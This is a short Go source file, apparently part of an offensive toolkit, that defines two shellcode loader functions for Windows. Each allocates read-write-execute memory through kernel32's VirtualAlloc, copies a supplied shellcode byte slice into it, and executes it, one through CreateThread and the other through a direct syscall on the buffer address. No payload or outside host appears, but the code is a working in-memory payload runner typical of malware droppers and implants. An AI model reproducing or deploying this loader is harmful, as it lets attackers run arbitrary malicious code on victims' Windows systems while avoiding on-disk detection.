package funcs

import (
	"syscall"
	"unsafe"
)

const MEM_COMMIT  = 0x1000
const MEM_RESERVE = 0x2000
const PAGE_EXECUTE_READWRITE = 0x40

var	K32 = syscall.MustLoadDLL("kernel32.dll")//kernel32.dll
var VirtualAlloc = K32.MustFindProc("VirtualAlloc")
var CreateThread = K32.MustFindProc("CreateThread")
var WaitForSingleObject = K32.MustFindProc("WaitForSingleObject")

func ThreadExecute(Shellcode []byte) {

	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))

	for i := 0; i < len(Shellcode); i++ {
		AddrPtr[i] = Shellcode[i]
	}

	ThreadAddr, _, _ := CreateThread.Call(0, 0, Addr, 0, 0, 0)

	WaitForSingleObject.Call(ThreadAddr, 0xFFFFFFFF)
}

func SyscallExecute(Shellcode []byte) (bool){

	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))

	for i := 0; i < len(Shellcode); i++ {
		AddrPtr[i] = Shellcode[i]
	}

	go syscall.Syscall(Addr, 0, 0, 0, 0)
	return true
}
